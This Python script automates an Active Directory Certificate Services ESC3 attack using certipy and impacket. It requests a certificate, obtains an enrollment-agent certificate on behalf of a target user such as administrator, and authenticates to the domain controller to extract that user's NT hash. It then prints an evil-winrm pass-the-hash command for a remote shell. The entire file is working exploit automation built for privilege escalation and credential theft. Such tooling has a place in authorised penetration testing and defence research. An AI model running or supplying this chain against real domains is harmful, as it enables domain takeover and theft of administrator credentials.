import subprocess
import re
import argparse
import os

def request_certificate(args):
    """Request a certificate using certipy req."""
    print("[*] Requesting certificate...")
    
    # Build the certipy req command
    req_command = [
        "certipy", "req",
        "-username", args.username,
        "-password", args.password,
        "-ca", args.ca,
        "-target", args.target,
        "-template", args.template,
        "-upn", args.upn,
        "-dns", args.dns,
    ]
    
    # Handle Kerberos authentication if specified
    if args.kerberos:
        print(f"[+] Kerberos authentication is enabled.")
        print(f"[+] Requesting TGT for you (ensure impacket is installed)")

        # Convert username to format acceptable by impacket-gettgt
        username_parts = args.username.split('@')
        tgt_command = [
            "impacket-gettgt",
            f"{username_parts[0]}/{username_parts[1]}:{args.password}",
            "-dc-ip", args.dc_ip
        ]
        
        # Run impacket-gettgt to get TGT
        tgt_process = subprocess.Popen(tgt_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = tgt_process.communicate()
        
        # Check if the TGT was successfully retrieved
        if f"{args.username}.ccache" in stdout:
            print(f"[+] Retrieved TGT, setting KRB5CCNAME={args.username}.ccache")
            os.environ["KRB5CCNAME"] = f"{args.username}.ccache"
        else:
            print("[!] Failed to retrieve TGT.")
            print(stderr)
            return
        
        # Add the -k flag for Kerberos authentication
        req_command.append("-k")
    
    # Additional options
    if args.ns:
        req_command.append("-ns")
        req_command.append(args.ns)
    if args.scheme:
        req_command.append('-scheme')
    
    # Run certipy req command to request certificate
    req_process = subprocess.Popen(req_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = req_process.communicate()
        
    # Display output
    print(stdout)
    print(stderr)
        
    # Parse saved certificate and private key file
    pfx_file_match = re.search(r"Saved certificate and private key to '(.*?\.pfx)'", stdout)
    if not pfx_file_match:
        print("[!] Failed to retrieve the .pfx file from the request output.")
        return None  # Explicitly returning None if no pfx file is found
    
    pfx_file = pfx_file_match.group(1)
    print(f"[*] Found .pfx file: {pfx_file}")
    return pfx_file

def request_agent_certificate(args, pfx_file):
    """Request an agent certificate using certipy req."""
    print("[*] Requesting agent certificate...")

    # Build the certipy req command for agent certificate
    req_command = [
        "certipy", "req",
        "-username", args.username,
        "-password", args.password,
        "-ca", args.ca,
        "-target", args.target,
        "-template", "USER",
        "-on-behalf-of", args.target_user,
        "-pfx", pfx_file
    ]
    
    if args.kerberos:
        req_command.append("-k")
    if args.ns:
        req_command.append("-ns")
        req_command.append(args.ns)
    
    # Run certipy req command to request certificate
    req_process = subprocess.Popen(req_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = req_process.communicate()
        
    # Display output
    print(stdout)
    print(stderr)
        
    # Parse saved certificate and private key file
    pfx_file_match = re.search(r"Saved certificate and private key to '(.*?\.pfx)'", stdout)
    if not pfx_file_match:
        print("[!] Failed to retrieve the .pfx file from the request output.")
        return None  # Explicitly returning None if no pfx file is found
    
    pfx_file = pfx_file_match.group(1)
    print(f"[*] Found .pfx file: {pfx_file}")
    return pfx_file

def authenticate_with_certificate(pfx_file, dc_ip, chose_identity=0):
    """Authenticate using the certificate."""
    print("[*] Authenticating using the certificate...")
    auth_command = ["certipy", "auth", "-pfx", pfx_file, "-dc-ip", dc_ip]
    
    auth_process = subprocess.Popen(auth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
    stdout, stderr = auth_process.communicate()
    
    if "Found multiple identifications in certificate" in stdout:
        print("[*] Multiple identities detected. Selecting the first one...")
        auth_process = subprocess.Popen(
            auth_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            text=True,
        )
        # Automatically select the first identity
        stdout, stderr = auth_process.communicate(input=f"{chose_identity}\n")  

    print("Authentication Output:")
    print(stdout)
    print(stderr)
    
    # Parse NT hash (optional)
    nt_hash_match = re.search(r"Got NT hash for .*?: ([a-fA-F0-9]{32})", stdout)
    if nt_hash_match:
        nt_hash = nt_hash_match.group(1)
        print(f"[*] NT Hash: {nt_hash}")
        print(f"[>] run evil-winrm -i {dc_ip} -H {nt_hash} to get a shell")
    else:
        print("[!] Failed to retrieve NT hash.")
def run_ceritpy_esc3(args):
    """Main function to run certipy ESC3 exploit automation."""
    # Run the certipy ESC3 automation
    print("[*] Running ESC3 attack chain automation")
    pfx_file = request_certificate(args)
    if pfx_file:
        agent_pfx_file = request_agent_certificate(args, pfx_file)
        if agent_pfx_file:
            authenticate_with_certificate(agent_pfx_file, args.dc_ip)

def main():
    """Parse arguments and run the automation script."""
    parser = argparse.ArgumentParser(description="Automate Certipy ESC3 Exploit")
    parser.add_argument("-u", "--username", required=True, help="Username (e.g., john@corp.local)")
    parser.add_argument("-p", "--password", required=True, help="Password (e.g., Passw0rd)")
    parser.add_argument("-c", "--ca", required=True, help="Certificate Authority (e.g., corp-DC-CA)")
    parser.add_argument("-t", "--target", required=True, help="Target CA hostname (e.g., ca.corp.local)")
    parser.add_argument("--template", required=True, help="Certificate template (e.g., ESC3-Test)")
    parser.add_argument("--upn", required=True, help="UPN (e.g., administrator@corp.local)")
    parser.add_argument("--dns", required=True, help="DNS (e.g., dc.corp.local)")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP (e.g., 172.16.126.128)")
    parser.add_argument("--target_user", required=True, help="Target user domain/user (e.g. CORP/administrator")
    parser.add_argument("--kerberos", action="store_true", help="Enable Kerberos authentication (TGT)")
    parser.add_argument("--ns", help="name server (e.g., 172.16.126.128) helpful when there no real dns resolver when we just using /etc/hosts")
    parser.add_argument("--scheme", action="store_true", help="Enable scheme option")
    
    args = parser.parse_args()

    run_ceritpy_esc3(args)
if __name__ == "__main__":
    main()
